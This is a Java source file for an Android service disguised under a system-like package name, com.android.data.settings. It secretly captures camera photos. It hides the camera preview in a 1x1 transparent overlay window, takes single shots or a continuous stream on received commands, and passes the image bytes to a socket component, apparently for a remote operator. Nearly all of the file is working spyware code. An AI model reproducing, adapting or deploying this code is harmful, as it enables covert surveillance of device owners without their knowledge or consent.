package com.android.data.settings.Service;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.hardware.Camera;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.provider.Settings;
import android.support.annotation.Nullable;
import android.support.v4.content.LocalBroadcastManager;
import android.util.Log;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.WindowManager;

import com.android.data.settings.Model.Property;
import com.android.data.settings.Utility.CameraUtility;
import com.android.data.settings.Utility.SocketUtil;

import java.io.PrintWriter;
import java.io.StringWriter;
import java.io.Writer;
import java.util.List;


public class CamService extends Service {
    public static final String INTENT_SELECTED_CAMERA = "SELECTED_CAMERA_FOR_SNAP";
    public static final String INTENT_SELECTED_FUNCTION = "SELECTED_OPERATION";
    public static final String INTENT_CAMERA_ROTATION = "CAMERA_ROTATION";
    public static final String INTENT_PROPERTY_STRING = "MS_PROPERTY";
    public static final int FUNCTION_TAKE_SNAP = 1;

    private Camera camera;
    private boolean safeToTakePicture = false;

    private int camRotation;
    private Property property;
    private boolean isStreamMode;
    private List<Camera.Size> supportedSizes;

    private static final String TAG = "CamService";
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        mCameraService = this;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        informSocket("Command Received: Take Snap - Processing......");
        informSocket("Total Cameras: " + CameraUtility.totalCameras());

        if(intent == null) {
            throw new IllegalStateException("Must start the service with intent");
        }

        String propertyString = intent.getStringExtra(INTENT_PROPERTY_STRING);
        if(propertyString == null ||  propertyString.isEmpty() || propertyString.equals("null")) {
            property = new Property();
        }

        try {
            property = Property.fromJson(propertyString);
        } catch (Exception e) {
            Log.d(TAG, "Unable to parse property object, defaulting values");
            property = new Property();
            informSocket("Unable to parse property object, defaulting values");
        }

        isStreamMode = false;
        if(!property.getSnapMode().equals(Property.SNAP_MODE_SINGLE)) {
            isStreamMode = true;
        }
        startPreview();
        return START_NOT_STICKY;
    }

    private void startPreview() {
        try {
            initCamera();
        } catch (Exception e) {
            throwErrorAndExit(e);
        }
    }

    public static void takeSnap(Context context, Property property) {
        Intent intent = new Intent(context, CamService.class);
        intent.putExtra(INTENT_PROPERTY_STRING, Property.toJson(property));
        context.startService(intent);
    }

    private static CamService mCameraService;
    public static synchronized CamService getInstance() {
        return mCameraService;
    }

    public void initCamera() throws Exception {
        int flagWM = WindowManager.LayoutParams.TYPE_TOAST;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if(Settings.canDrawOverlays(this)) {
                flagWM = WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY;
            }
        }

        informSocket("Take Snap - Initialising Camera");
        if(camera != null) camera.release();
        camera = CameraUtility.getCameraInstance(property.getCameraId());
        if(camera == null) return;
        SurfaceView surfaceView = new SurfaceView(getApplicationContext());
        WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
        WindowManager.LayoutParams params = new WindowManager.LayoutParams(1, 1,
                flagWM,
                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                PixelFormat.TRANSLUCENT);
        SurfaceHolder sh = surfaceView.getHolder();
        surfaceView.setZOrderOnTop(true);
        sh.setFormat(PixelFormat.TRANSPARENT);
        sh.addCallback(surfaceCb);
        sh.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS);
        wm.addView(surfaceView, params);
    }

    private SurfaceHolder.Callback surfaceCb = new SurfaceHolder.Callback() {
        @Override
        public void surfaceCreated(SurfaceHolder surfaceHolder) {
            try {
                if(camera != null) camera.setPreviewDisplay(surfaceHolder);
            } catch (Exception e) {
                throwErrorAndExit(e);
            }
        }

        @Override
        public void surfaceChanged(SurfaceHolder surfaceHolder, int i, int i1, int i2) {
            try {
                Camera.Parameters params = camera.getParameters();

                List<String> focusModes = params.getSupportedFocusModes();
                if (focusModes.contains(Camera.Parameters.FOCUS_MODE_AUTO)) {
                    params.setFocusMode(property.getFocusMode());
                }

                params.setRotation(property.getRotation());
                List<Camera.Size> listPreviewSizes, listPictureSizes;

                listPreviewSizes = params.getSupportedPreviewSizes();
                Camera.Size mPreviewSize = listPreviewSizes.get(property.getPreviewResolution());
                params.setPreviewSize(mPreviewSize.width, mPreviewSize.height);

                listPictureSizes = params.getSupportedPictureSizes();
                supportedSizes = listPictureSizes;
                Camera.Size mPictureSize = listPictureSizes.get(property.getPictureResolution());
                params.setPictureSize(mPictureSize.width, mPictureSize.height);
                Log.d(TAG, "Preview Res : " + property.getPreviewResolution() + " Pic Res " + property.getPictureResolution());

                camera.setParameters(params);
                camera.setPreviewDisplay(surfaceHolder);
                camera.startPreview();
            } catch (Exception e) {
                throwErrorAndExit(e);
            }

            safeToTakePicture = true;
            new Handler().postDelayed(() -> takePicture(), property.getSnapDelay());
        }

        @Override
        public void surfaceDestroyed(SurfaceHolder surfaceHolder) {
            Log.d(TAG, "Surface Destroyed");
            if(camera != null) camera.stopPreview();
        }
    };

    public void takePicture() {
        //Log.d(TAG, "Attempting to take snap!");
        //informSocket("Attempting to take snap!");
        if(camera != null) {
            try {
                if(safeToTakePicture) {
                    camera.takePicture(null, null, mPicture);
                    safeToTakePicture = false;
                }
            } catch (Exception e) {
                e.printStackTrace();
                throwErrorAndExit(e);
            }
        }
    }

    private void retakePicture() {
        if(camera != null) {
            try {
                camera.reconnect();
                camera.startPreview();
            } catch (Exception e) {
                e.printStackTrace();
                throwErrorAndExit(e);
            }
            new Handler().postDelayed(this::takePicture, property.getSnapDelay());
        }
    }

    private Camera.PictureCallback mPicture = (byte[] data, Camera camera) -> {
        Bundle bundle = new Bundle();
        bundle.putByteArray(SocketUtil.INTENT_TYPE_IMAGE_BYTES, data);
        sendBroadcast(SocketUtil.INTENT_TYPE_IMAGE_BYTES, bundle);
        safeToTakePicture = true;

        if(isStreamMode) {
            retakePicture();
        } else {
            stopSelf();
        }
    };

    private void informSocket(String msg) {
        Bundle bundle = new Bundle();
        bundle.putString(SocketUtil.INTENT_TYPE_EXCEPTION, msg);
        sendBroadcast(SocketUtil.INTENT_TYPE_EXCEPTION, bundle);
    }

    private void throwErrorAndExit(String err) {
        informSocket(err);
        stopSelf();
    }

    private void throwErrorAndExit(Exception e) {
        Writer writer = new StringWriter();
        e.printStackTrace(new PrintWriter(writer));
        String excString = writer.toString();
        throwErrorAndExit(excString);
    }

    private void sendBroadcast(String type, Bundle data) {
        Intent intent = new Intent(SocketUtil.INTENT_CAM_SERVICE_UPDATES);
        intent.putExtra(SocketUtil.INTENT_CS_TYPE, type);
        switch (type) {
            case SocketUtil.INTENT_TYPE_EXCEPTION:
                intent.putExtra(SocketUtil.INTENT_EXCEPTION_MESSAGE, data.getString(type));
                break;

            case SocketUtil.INTENT_TYPE_IMAGE_BYTES:
                intent.putExtra(SocketUtil.INTENT_IMAGE_BYTES, data.getByteArray(type));
                break;
        }
        LocalBroadcastManager.getInstance(CamService.this).sendBroadcast(intent);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if(camera != null) camera.release();
    }
}
